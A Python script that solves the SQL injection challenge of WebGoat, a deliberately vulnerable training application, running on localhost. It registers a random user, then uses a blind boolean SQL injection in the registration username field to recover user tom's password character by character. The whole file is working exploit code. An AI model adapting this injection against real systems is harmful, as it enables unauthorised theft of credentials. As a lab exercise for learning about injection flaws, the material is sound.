#!/usr/local/bin/python3
# danicrg

# Must be executed while the local server is running!!

import requests
from string import *
import re
from random import *

s = requests.Session()

# Registers a random user
characters = ascii_lowercase + ascii_uppercase + digits

username = ''.join(choice(characters) for i in range(12))
password = '123456'

url = 'http://localhost:8080/WebGoat/register.mvc'
s.post(url, params={'username': username, 'password': password, 'matchingPassword': password, 'agree': 'agree'})

# Interesting part

url = 'http://localhost:8080/WebGoat/SqlInjection/challenge'

tom_password = '%'

while (True):
    counter = 1
    for char in characters:
        test_pass = tom_password.replace("%", char + "%")
        params = {'username_reg': "tom' and password like '%s" % test_pass, 'email_reg': 'tom@tom', 'password_reg': 'tom', 'confirm_password_reg': 'tom'}
        # print('testing %s' % test_pass.replace("%", ""))
        response = s.put(url, params=params)
        content = response.text
        counter += 1
        if "already exists" in content:
            tom_password = test_pass
            print('password starts with %s ' % test_pass.replace("%", ""))
            break
    if len(characters) < counter:
        break


print("the password is: " + tom_password.replace("%", ""))
